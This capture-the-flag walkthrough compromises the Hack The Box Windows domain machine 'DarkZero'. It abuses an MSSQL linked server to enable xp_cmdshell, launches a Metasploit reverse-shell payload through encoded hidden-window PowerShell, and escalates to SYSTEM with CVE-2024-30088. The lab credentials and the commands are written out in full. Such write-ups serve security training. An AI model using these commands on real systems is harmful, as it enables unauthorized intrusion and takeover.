HTB Write-up: DarkZero

A Professional Walkthrough on Exploiting a Hard Windows Domain

Difficulty: Hard OS: Windows AD

Introduction (TL;DR)

This report details the compromise of the hard-rated Windows Active Directory machine, **DarkZero**. The attack chain relies heavily on abusing a **multihomed DNS configuration** and exploiting a misconfigured **MSSQL linked server** to pivot from an external interface to an internal network.

The initial access vector uses provided credentials: john.w:RFulUtONCOL!. The path to the user flag involves enabling `xp_cmdshell` on a linked server (**DC02.darkzero.ext**), executing a Meterpreter payload, and performing a local privilege escalation using **CVE-2024–30088** to reach `NT AUTHORITY\SYSTEM` on the internal host.

1. Initial Enumeration

The target IP is identified as a Domain Controller (**DC01.darkzero.htb**). An initial full-port Nmap scan confirms multiple Active Directory services are running, alongside a crucial **Microsoft SQL Server (MSSQL)** instance on port 1433.

Nmap Scan Results

The scan confirms the presence of standard AD ports (53, 88, 389, 445, etc.) and explicitly identifies the target as an Active Directory LDAP server. Most importantly, it reveals **MSSQL on 1433** (Product Version: 10.0.26100).

BASH
nmap -p 1-65535 -T4 -A -v 10.10.11.89

SMB & Credential Testing

Using the provided credentials, we test for authenticated access using `smbmap` and `nxc`, confirming the user `john.w` can authenticate but only has default read-only access to standard shares (`NETLOGON`, `SYSVOL`).

SMB shares are default and read-only for the `john.w` user.

2. AD Recon & Multihomed Host

The key to pivoting on this machine lies in understanding its network configuration.

Discovering the Multihomed Host

A DNS query for the domain `darkzero.htb` reveals two separate IP addresses, indicating the DC is **multihomed** or using **split-horizon DNS** across different RFC1918 ranges:

  • External Network: `10.10.11.89`
  • Internal Network: `172.16.20.1`
BASH
dig @DC01.darkzero.htb ANY darkzero.htb

The DNS response shows two A records, confirming the host is multihomed on 10.10.x.x and 172.16.x.x networks.

This suggests that a Meterpreter shell, when acquired, will likely connect back on the **internal interface**, allowing us to communicate with other hosts on the 172.16.x.x network.

Preparing the Meterpreter Payload

We prepare a base64-encoded reverse shell payload using Metasploit's `exploit/multi/script/web_delivery`, listening on our VPN interface (`tun0`).

MSFCONSOLE
msfconsole -q -x "use exploit/multi/script/web_delivery ; set payload windows/x64/meterpreter/reverse_tcp ; set LHOST tun0 ; set LPORT 443 ; set target 2 ; exploit -j"

Metasploit handler set up, generating a Base64-encoded PowerShell command for remote execution.

3. Linked Server Exploitation

We use the authenticated credentials to connect to the MSSQL instance on DC01 and attempt to gain command execution via the `xp_cmdshell` stored procedure.

Initial MSSQL Connection

BASH
mssqlclient.py 'darkzero.htb/john.w:RFulUtONCOL!@10.10.11.89' -windows-auth

We initially try to enable `xp_cmdshell` on **DC01**, but the user `john.w` lacks the necessary privileges, resulting in an error.

Attempting to enable xp_cmdshell fails due to insufficient permissions on DC01.

Pivoting via Linked Server

Next, we check for linked servers using the `enum_links` command. This reveals a connection to another host, **DC02.darkzero.ext**, which is accessed using the local account `darkzero\john.w` but maps to the high-privilege remote login **`dc01_sql_svc`** on DC02.

SQL
enum_links

The linked server DC02.darkzero.ext is discovered, utilizing the high-privileged remote login `dc01_sql_svc`.

We use the linked server context to successfully enable `xp_cmdshell` on **DC02.darkzero.ext** as the `dc01_sql_svc` user.

SQL
use_link "DC02.darkzero.ext"
enable_xp_cmdshell

xp_cmdshell is successfully enabled on the linked server DC02.darkzero.ext using the elevated context.

Remote Code Execution and Shell

We execute the Meterpreter web delivery payload generated earlier using the newly enabled `xp_cmdshell` on DC02.

SQL
xp_cmdshell "powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQB....snipped=="

The Meterpreter session successfully connects back to our listener, establishing a foothold on **DC02.darkzero.ext** as the user **`darkzero-ext\svc_sql`**.

Meterpreter session successfully opened as `darkzero-ext\svc_sql`.

Checking the active sessions in Metasploit confirms the connection and the session information.

Metasploit confirms the Meterpreter session 1 is active on the 172.16.20.2 interface.

Checking the network interface confirms the shell is communicating from the internal network address: **`172.16.20.2`**.

Running `ifconfig` shows the shell is operating on the internal interface 172.16.20.2.

Before proceeding, we can view the Metasploit server window, which shows the established session and the internal network routes discovered.

4. Local PrivEsc & User Flag

We are currently operating as the service account `svc_sql` on the internal DC02. The next objective is to escalate privileges locally to gain access to the user flag.

Local Exploit Suggester

We use the Metasploit `local_exploit_suggester` to find available paths to `SYSTEM` privileges.

MSFCONSOLE
use multi/recon/local_exploit_suggester
set session 1
run

The local exploit suggester identifies several potential exploits.

Exploiting CVE-2024–30088

Based on the findings, we choose to exploit **CVE-2024–30088**, a local privilege escalation vulnerability. We set the exploit options, including the payload, and ensure `AutoCheck` is disabled before running.

MSFCONSOLE
use exploit/windows/local/cve_2024_30088_authz_basep
set payload windows/x64/meterpreter_reverse_tcp
set session 1
set lhost tun0 
set AutoCheck false 
run

Verifying the payload options before running the local exploit.

The exploit successfully injects the payload and steals the `SYSTEM` token from memory, granting us a new session with elevated privileges.

The exploit succeeds, opening a new Meterpreter session with `NT AUTHORITY\SYSTEM` privileges.

Retrieving the User Flag

With `SYSTEM` access, we can now easily navigate to the Administrator's desktop to retrieve the user flag.

METERPRETER
type c:\Users\Administrator\Desktop\user.txt

User flag successfully read from the filesystem on DC02.

6. Conclusion

The DarkZero machine serves as a brilliant example of a complex penetration test involving multiple stages: authenticated enumeration, network reconnaissance to identify the multihomed configuration, lateral movement via a chained MSSQL linked server exploit, and finally, local privilege escalation to reach SYSTEM. The vulnerability chain highlights the severe security risks introduced by service accounts with excessive permissions and poor network segmentation between critical systems.

Future steps will focus on the inter-DC pivot using Kerberos exploitation to achieve full domain compromise.
